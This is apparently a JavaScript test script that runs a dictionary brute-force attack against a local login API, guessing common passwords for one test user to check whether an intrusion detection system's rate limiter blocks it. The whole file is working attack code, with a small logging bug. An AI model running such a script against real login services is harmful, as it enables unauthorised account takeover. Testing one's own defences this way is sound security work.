// 🔥 BRUTE FORCE ATTACK - Single User, Multiple Passwords
(async function() {
    console.clear();
    console.log('🔥 BRUTE FORCE ATTACK INITIATED');
    console.log('Target: testuser');
    console.log('Method: Password guessing\n');
    console.log('='.repeat(60));
    
    const API = 'http://localhost:5000/api';
    const target = 'testuser';
    
    // Common passwords attackers try
    const passwords = [
        'password', '123456', 'password123', 'admin', 'letmein',
        'qwerty', 'welcome', '12345678', 'abc123', 'password1',
        'admin123', 'root', 'test123', 'pass123', 'user123',
        '111111', 'password!', 'Pass123', 'test', 'user'
    ];
    
    let attempts = 0;
    let blocked = false;
    
    console.log(`\n🎯 Attempting to crack account: ${target}`);
    console.log(`📋 Password dictionary: ${passwords.length} entries\n`);
    
    for (let password of passwords) {
        attempts++;
        console.log(`[${attempts}/${passwords.length}] Trying: "${password}".padEnd(15)`, '→ ');
        
        try {
            const res = await fetch(`${API}/login`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: target,
                    password: password
                })
            });
            
            if (res.status === 429) {
                console.log('🚫 BLOCKED BY RATE LIMITER!');
                blocked = true;
                break;
            } else if (res.ok) {
                console.log('✅ PASSWORD CRACKED!');
                console.log(`\n🎉 SUCCESS: Account compromised with password: "${password}"`);
                return;
            } else {
                console.log('❌ Failed');
            }
            
        } catch (error) {
            console.log('⚠️ Error');
        }
        
        // Delay between attempts (500ms = realistic attack speed)
        await new Promise(r => setTimeout(r, 500));
    }
    
    console.log('\n' + '='.repeat(60));
    console.log('📊 ATTACK SUMMARY:');
    console.log('='.repeat(60));
    console.log(`Total Attempts: ${attempts}/${passwords.length}`);
    
    if (blocked) {
        console.log('Status: 🛡️ BLOCKED BY IDS');
        console.log('\n✅ IDS SUCCESSFULLY DEFENDED AGAINST BRUTE FORCE!');
    } else {
        console.log('Status: ❌ Attack exhausted password list');
    }
    
    console.log('='.repeat(60));
    console.log('\n👉 Check admin dashboard for detection details');
    
})();
